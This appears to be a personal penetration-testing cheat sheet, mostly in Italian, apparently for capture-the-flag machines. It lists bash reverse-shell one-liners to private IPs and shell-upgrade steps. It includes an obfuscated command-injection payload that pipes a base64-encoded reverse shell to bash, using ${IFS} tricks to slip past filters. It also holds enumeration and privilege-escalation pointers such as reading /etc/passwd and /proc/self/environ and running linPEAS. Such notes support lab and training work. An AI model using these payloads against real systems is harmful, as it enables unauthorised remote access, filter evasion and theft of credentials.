
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"


python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
control Z (stoppare mandare in background)  ritorno su shell locale
stty raw -echo;fg;








- whoami
- pwd
- etc/passwd per vedere se ci sono altre persone, se non c'è nessuno vai su root

se non trovo niente allora
linPEAS 
winPEAS


poi se non va ancora
PSPI





fare un wget prima per capire se non è blind


echo {BASE64 da burp}|base64 -d|bash
${IFS}

;echo${IFS%25%3f%3f}YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4yMzkvMTIzNDUgMD4mMQ%3d%3d|base64${IFS%25%3f%3f}-d|bash;









per controllare variabili ambiente
env
cat /proc/self/environ






ss -lntp
ps -ef | grep {PID}

Il comando ps aux è utilizzato per visualizzare una lista dettagliata dei processi in esecuzione sul sistema. La sua sintassi è:
ps aux





- cat /etc/passwd | grep sh$











From this point on, we have complete access as the christine user on the target machine, and can start
enumerating it for potential files or services that we can explore further. A crucial command at this point in
time is the ss command, which stands for socket statistics , and can be used to check which ports are
listening locally on a given machine.

-l: Display only listening sockets.
-t: Display TCP sockets.
-n: Do not try to resolve service names.
ss -tln
con ss -tl poi possiamo risolvere il nome (che si sostituisce alla porta)